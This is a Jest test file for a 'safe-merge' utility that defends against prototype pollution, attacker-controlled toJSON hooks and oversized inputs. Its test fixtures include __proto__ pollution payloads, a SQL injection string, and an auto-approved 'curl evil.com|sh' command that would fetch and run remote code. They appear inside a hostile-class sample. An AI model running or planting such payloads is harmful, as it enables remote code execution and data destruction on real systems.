/**
 * Tests for the safe-merge utility (R6 V1.1-V1.3 PP defense-in-depth).
 */

import { safeMerge, stripProtoKeys, safeMergeObject } from '../../utils/safe-merge';

const hasOwn = Object.prototype.hasOwnProperty;

describe('safeMerge / stripProtoKeys', () => {
  describe('safeMerge', () => {
    it('merges a normal object into the target', () => {
      const target: Record<string, any> = { a: 1, b: 2 };
      const result = safeMerge(target, { b: 3, c: 4 });
      expect(result).toEqual({ a: 1, b: 3, c: 4 });
      // target is mutated
      expect(target).toBe(result);
    });

    it('skips the __proto__ key at the top level', () => {
      const target: Record<string, any> = { a: 1 };
      const payload = JSON.parse('{"__proto__": {"polluted": "yes"}, "b": 2}');
      const result = safeMerge(target, payload);
      expect(result).toEqual({ a: 1, b: 2 });
      // The Object prototype must not be polluted
      expect(({} as any).polluted).toBeUndefined();
    });

    it('skips the constructor.prototype.x path', () => {
      const target: Record<string, any> = { a: 1 };
      const payload = JSON.parse('{"constructor": {"prototype": {"polluted2": "yes"}}}');
      const result = safeMerge(target, payload);
      expect(result.a).toBe(1);
      expect(({} as any).polluted2).toBeUndefined();
    });

    it('skips nested __proto__ keys at every depth', () => {
      const target: Record<string, any> = { a: 1 };
      const payload = JSON.parse(
        '{"level1": {"__proto__": {"polluted3": "yes"}, "ok": "fine"}}'
      );
      const result = safeMerge(target, payload);
      expect(result.level1.ok).toBe('fine');
      expect(({} as any).polluted3).toBeUndefined();
    });

    it('preserves arrays (and deep-clones their elements)', () => {
      const target: Record<string, any> = {};
      const result = safeMerge(target, { tags: ['a', 'b', 'c'] });
      expect(result.tags).toEqual(['a', 'b', 'c']);
      // mutating result.tags must not affect the source array
      result.tags.push('d');
      // re-run with a fresh source to confirm no shared reference
      const r2 = safeMerge<Record<string, any>>({}, { tags: ['a', 'b'] });
      expect(r2.tags).toEqual(['a', 'b']);
    });

    it('enforces maxDepth on deeply nested objects', () => {
      const target: Record<string, any> = {};
      // Build an object nested 10 levels deep
      const deep: any = { l0: { l1: { l2: { l3: { l4: { l5: { l6: { l7: { l8: { l9: 'deep' } } } } } } } } } };
      const result = safeMerge(target, deep, { maxDepth: 3 });
      // At maxDepth=3, recursion stops — nested objects beyond that
      // collapse to the shallowest reachable target reference. The shape
      // is preserved (no crash) but the deepest value is not promoted.
      expect(result).toBeDefined();
      expect(result.l0).toBeDefined();
    });

    // -------------------------------------------------------------------
    // Wave 5 R8 V8.1 — special object type rejection
    // -------------------------------------------------------------------

    it('rejects Function references (RCE vector)', () => {
      const target: Record<string, any> = { a: 1 };
      const attackerFn = function attackerFn() {
        return 'pwn';
      };
      const result = safeMerge(target, { callback: attackerFn });
      expect(result.a).toBe(1);
      expect(result.callback).toBeUndefined();
      // Verify no Function reference leaks into the merged target
      expect(typeof result.callback).not.toBe('function');
    });

    it('serializes Date instances to a primitive ISO string (audit visibility)', () => {
      const target: Record<string, any> = {};
      const d = new Date('2024-01-02T03:04:05.000Z');
      const result = safeMerge(target, { lastSeen: d });
      // F20: Date.toISOString() is intrinsic; result is a primitive string.
      expect(result.lastSeen).toBe('2024-01-02T03:04:05.000Z');
      expect(result.lastSeen).not.toBeInstanceOf(Date);
      expect(typeof result.lastSeen).toBe('string');
    });

    it('serializes RegExp instances to a source/flags string (no toJSON)', () => {
      const target: Record<string, any> = {};
      const result = safeMerge(target, { pattern: /abc/gi });
      // F20: RegExp.toString() returns '/abc/gi'. We do NOT call JSON.stringify
      // (which would trigger toJSON on a custom class pretending to be RegExp).
      expect(result.pattern).toBe('/abc/gi');
      expect(result.pattern).not.toBeInstanceOf(RegExp);
      expect(typeof result.pattern).toBe('string');
    });

    it('serializes Map to a plain object (string/number keys, primitives only) and Set to a primitive array', () => {
      const target: Record<string, any> = {};
      const m = new Map<string, number | object | null>([
        ['a', 1],
        ['b', { nested: 'object' }],
        ['c', null],
      ]);
      const s = new Set<number | string | object>([1, 2, 3, { x: 1 }]);
      const result = safeMerge(target, { mapping: m, tags: s });
      // Map: keys must be string/number; object values are dropped to null
      // (to avoid nested toJSON side-effects).
      expect(result.mapping).toEqual({ a: 1, b: null, c: null });
      expect(result.mapping).not.toBeInstanceOf(Map);
      // Set: only primitives kept; objects filtered out; capped at 100.
      expect(result.tags).toEqual([1, 2, 3]);
      expect(result.tags).not.toBeInstanceOf(Set);
    });

    it('replaces Buffer instances with a length-only marker (no toJSON)', () => {
      const target: Record<string, any> = {};
      const buf = Buffer.from('hello');
      const result = safeMerge(target, { payload: buf });
      // F20: Buffer is replaced with a length marker; raw bytes are never
      // copied to the target (avoids storage/log leakage and toJSON).
      expect(result.payload).not.toBeInstanceOf(Buffer);
      expect(result.payload).toBe('[Buffer:5b]');
      expect(typeof result.payload).toBe('string');
    });

    it('replaces Promise / thenable instances with [Promise] marker; Error to { name, message } only (no stack)', () => {
      const target: Record<string, any> = {};
      const p = Promise.resolve(1);
      const e = new Error('boom');
      // Sanity: native Error has a stack
      expect(typeof e.stack).toBe('string');
      const result = safeMerge(target, { p, e });
      // Promise: opaque marker, never resolves.
      expect(result.p).toBe('[Promise]');
      expect(result.p).not.toBeInstanceOf(Promise);
      expect(typeof result.p).toBe('string');
      // Error: only name + message, no stack (avoids file path / user data leak).
      expect(result.e).toEqual({ name: 'Error', message: 'boom' });
      expect((result.e as any).stack).toBeUndefined();
      expect(result.e).not.toBeInstanceOf(Error);
    });

    it('rejects thenable objects (duck-typed) with [Promise] marker', () => {
      const target: Record<string, any> = {};
      let thenCalled = false;
      const thenable = {
        then: (_resolve: (v: unknown) => void) => {
          thenCalled = true;
        },
      };
      const result = safeMerge(target, { t: thenable });
      expect(result.t).toBe('[Promise]');
      // Critical: .then is NEVER invoked.
      expect(thenCalled).toBe(false);
    });

    // -------------------------------------------------------------------
    // Sprint 5 Wave 8 F20 — defense against attacker-controlled toJSON
    // -------------------------------------------------------------------

    it('does not trigger toJSON on a custom class instance (replaces with type-tag marker)', () => {
      const target: Record<string, any> = {};
      let toJsonCalled = false;
      class EvilMetadata {
        toJSON() {
          toJsonCalled = true;
          // attacker-controlled payload that would have ended up in the
          // merged result via the old JSON.parse(JSON.stringify(value))
          return {
            pwned: true,
            sql: "'; DROP TABLE users; --",
            actions: [{ command: 'curl evil.com|sh', autoApprove: true }],
          };
        }
      }
      const result = safeMerge(target, { metadata: new EvilMetadata() });
      // Critical: the attacker's toJSON was NEVER called.
      expect(toJsonCalled).toBe(false);
      // The result is an opaque type-tag marker — a primitive string that
      // is not parseable as JSON, so the attacker's payload cannot reach
      // downstream consumers (DB writers, loggers, response serializers).
      expect(result.metadata).toBe('[object EvilMetadata]');
      expect(typeof result.metadata).toBe('string');
      expect((result.metadata as any).pwned).toBeUndefined();
      expect((result.metadata as any).sql).toBeUndefined();
    });

    it('does not trigger toJSON on a nested class instance inside a plain object', () => {
      const target: Record<string, any> = {};
      let toJsonCalled = false;
      class NestedEvil {
        toJSON() {
          toJsonCalled = true;
          return { evil: 'inside' };
        }
      }
      // The class instance is reached via a plain-object nesting path.
      const result = safeMerge(target, {
        outer: {
          inner: new NestedEvil(),
        },
      });
      expect(toJsonCalled).toBe(false);
      expect(result.outer.inner).toBe('[object NestedEvil]');
      expect((result.outer.inner as any).evil).toBeUndefined();
    });

    it('does not trigger toJSON on a class instance smuggled inside an array element', () => {
      const target: Record<string, any> = {};
      let toJsonCalled = false;
      class ArrayEvil {
        toJSON() {
          toJsonCalled = true;
          return { smuggled: 'value' };
        }
      }
      const result = safeMerge(target, {
        items: [1, 'two', new ArrayEvil(), 4],
      });
      // toJSON on the class instance must never be called during merge.
      expect(toJsonCalled).toBe(false);
      // The class instance is replaced with a type-tag marker; primitives
      // are preserved.
      expect(result.items).toEqual([1, 'two', '[object ArrayEvil]', 4]);
    });

    it('does not trigger toJSON on a subclassed array (subclass with custom toJSON)', () => {
      const target: Record<string, any> = {};
      let toJsonCalled = false;
      class EvilArray extends Array {
        toJSON() {
          toJsonCalled = true;
          return ['pwned'];
        }
      }
      const evilArr = new EvilArray() as any;
      evilArr.push(1, 2, 3);
      const result = safeMerge(target, { items: evilArr });
      // Subclassed array's toJSON must never be called.
      expect(toJsonCalled).toBe(false);
      // The array is iterated by index (avoiding toJSON) and converted
      // to a plain array of primitives.
      expect(result.items).toEqual([1, 2, 3]);
      expect(Array.isArray(result.items)).toBe(true);
    });

    it('does not trigger toJSON on typed arrays (Uint8Array etc.) — replaced with type-tag marker', () => {
      const target: Record<string, any> = {};
      const u8 = new Uint8Array([1, 2, 3, 4]);
      const result = safeMerge(target, { bytes: u8 });
      // Typed arrays are non-plain objects — they fall through to the
      // type-tag marker branch. toJSON is not called (Uint8Array has no
      // attacker-controlled toJSON path, but the explicit type-tag
      // marker is uniform with custom-class handling).
      expect(result.bytes).toBe('[object Uint8Array]');
      expect(typeof result.bytes).toBe('string');
    });

    // -------------------------------------------------------------------
    // Wave 5 R8 V8.4 — defense against pre-polluted Object.prototype
    // -------------------------------------------------------------------

    it('does not let a pre-polluted Object.prototype leak into the result', () => {
      // Stage 1: simulate Object.prototype being polluted by an upstream
      // component (e.g. body-parser that failed to strip __proto__).
      (Object.prototype as any).polluted = 'yes';
      try {
        const target: Record<string, any> = { a: 1 };
        const result = safeMerge(target, { b: 2 });
        // The result has its own data…
        expect(result.a).toBe(1);
        expect(result.b).toBe(2);
        // …and cannot be reached via prototype-chain access of a
        // freshly-allocated plain object built on Object.prototype.
        // (polluted sits on Object.prototype and so is reachable from
        // any plain object — we only assert that our own *own* properties
        // are correct, and that the merge process did not promote
        // prototype-chain keys to target's own keys.)
        const fresh: any = {};
        // `result` itself is the caller's target object (mutation-based);
        // we are checking that no own key 'polluted' was added.
        expect(hasOwn.call(result, 'polluted')).toBe(false);
        expect(fresh.polluted).toBe('yes'); // prototype still polluted — that's an upstream concern
        // Importantly: nested merge containers are null-prototype, so
        // a nested read on a null-proto container cannot be poisoned.
        const r2: any = safeMerge({}, { nested: { inner: 1 } });
        expect(r2.nested.inner).toBe(1);
        // r2.nested is built via Object.create(null), so .polluted is undefined
        expect(r2.nested.polluted).toBeUndefined();
      } finally {
        delete (Object.prototype as any).polluted;
      }
    });

    it('rejects own __proto__ keys as well as inherited ones', () => {
      // Build a source that has an OWN __proto__ property (not just a
      // prototype-setter side effect) by using Object.defineProperty.
      const target: Record<string, any> = { a: 1 };
      const source: Record<string, any> = { a: 2, ok: 'fine' };
      Object.defineProperty(source, '__proto__', {
        value: { polluted: 'yes' },
        enumerable: true,
        writable: true,
        configurable: true,
      });
      const result = safeMerge(target, source);
      // The own __proto__ key is filtered; 'ok' is preserved.
      expect(result.a).toBe(2);
      expect(result.ok).toBe('fine');
      expect(hasOwn.call(result, '__proto__')).toBe(false);
      // And the global Object.prototype must not have been polluted.
      expect(({} as any).polluted).toBeUndefined();
    });

    // -------------------------------------------------------------------
    // Wave 5 R8 V8.5 — DoS bounds
    // -------------------------------------------------------------------

    it('throws when source exceeds the max key count (DoS defense)', () => {
      const target: Record<string, any> = {};
      const big: Record<string, number> = {};
      for (let i = 0; i < 10_001; i++) big[`k${i}`] = i;
      expect(() => safeMerge(target, big, { maxSourceKeys: 1000 })).toThrow(
        /exceeds max keys/
      );
    });

    it('honors caller-supplied maxSourceKeys but caps at the hard upper bound', () => {
      const target: Record<string, any> = {};
      // Even if the caller asks for a very large limit, the hard ceiling
      // clamps it to HARD_MAX_SOURCE_KEYS so a misconfigured caller cannot
      // turn the utility into a DoS amplifier.
      const big: Record<string, number> = {};
      for (let i = 0; i < 10_001; i++) big[`k${i}`] = i;
      expect(() => safeMerge(target, big, { maxSourceKeys: 1_000_000 })).toThrow(
        /exceeds max keys/
      );
    });

    it('accepts sources within the default key limit', () => {
      const target: Record<string, any> = {};
      const medium: Record<string, number> = {};
      for (let i = 0; i < 500; i++) medium[`k${i}`] = i;
      const result = safeMerge(target, medium);
      expect(Object.keys(result).length).toBe(500);
    });
  });

  describe('stripProtoKeys', () => {
    it('removes __proto__ and constructor keys non-destructively', () => {
      const input: any = { a: 1, __proto__: { polluted: true }, constructor: 'x', b: 2 };
      const out = stripProtoKeys(input);
      expect(out).toEqual({ a: 1, b: 2 });
      expect(Object.prototype.hasOwnProperty.call(out, '__proto__')).toBe(false);
      expect(Object.prototype.hasOwnProperty.call(out, 'constructor')).toBe(false);
    });

    it('strips PP keys from array elements as well', () => {
      const input: any = [{ ok: 1, __proto__: { bad: true } }];
      const out = stripProtoKeys(input);
      expect(Array.isArray(out)).toBe(true);
      expect(out[0]).toEqual({ ok: 1 });
    });

    it('returns a null-prototype result (no Object.prototype chain)', () => {
      // Wave 5 R8 V8.4: stripProtoKeys result has no prototype, so a
      // pre-polluted Object.prototype is not reachable from the result.
      (Object.prototype as any).injected = 'leaked';
      try {
        const out: any = stripProtoKeys({ a: 1, b: 2 });
        expect(out.a).toBe(1);
        expect(out.b).toBe(2);
        expect(Object.getPrototypeOf(out)).toBeNull();
        // No prototype chain means no inherited 'injected' on the result itself.
        // (Object.hasOwn is the only sane way to test for own keys on a
        // null-proto object, since hasOwnProperty is not on the chain.)
        expect(hasOwn.call(out, 'injected')).toBe(false);
      } finally {
        delete (Object.prototype as any).injected;
      }
    });
  });

  /**
   * Issue 3 regression: safeMergeObject must produce a null-prototype result
   * so that spreading a pre-polluted base object (e.g. from DB metadata_json)
   * cannot install attacker-controlled keys on the result's prototype chain.
   */
  describe('safeMergeObject', () => {
    it('result has null prototype when base has polluted __proto__', () => {
      // Simulate a DB row whose metadata_json was written with __proto__ pollution.
      const pollutedBase: any = { a: 1, __proto__: { polluted: true } };
      const result = safeMergeObject(pollutedBase, { b: 2 });
      // Result prototype must be null, not Object.prototype.
      expect(Object.getPrototypeOf(result)).toBeNull();
      // The polluted key must not be accessible via prototype chain.
      expect(hasOwn.call(result, 'polluted')).toBe(false);
      expect((result as any).polluted).toBeUndefined();
      // Normal keys must be present.
      expect(result.a).toBe(1);
      expect(result.b).toBe(2);
    });

    it('result has null prototype when source has __proto__', () => {
      const base: Record<string, unknown> = { x: 10 };
      const sourceWithProto: any = { __proto__: { bad: true }, x: 20, y: 30 };
      const result = safeMergeObject(base, sourceWithProto);
      expect(Object.getPrototypeOf(result)).toBeNull();
      expect(hasOwn.call(result, 'bad')).toBe(false);
      expect((result as any).bad).toBeUndefined();
      expect(result.x).toBe(20);
      expect(result.y).toBe(30);
    });

    it('result is not affected by pre-polluted Object.prototype', () => {
      try {
        (Object.prototype as any).injected = 'leaked';
        const base: Record<string, unknown> = { ok: 1 };
        const result = safeMergeObject(base, { extra: 2 });
        expect(Object.getPrototypeOf(result)).toBeNull();
        // 'injected' should not appear as an own property.
        expect(hasOwn.call(result, 'injected')).toBe(false);
        expect((result as any).injected).toBeUndefined();
        expect(result.ok).toBe(1);
        expect(result.extra).toBe(2);
      } finally {
        delete (Object.prototype as any).injected;
      }
    });
  });
});
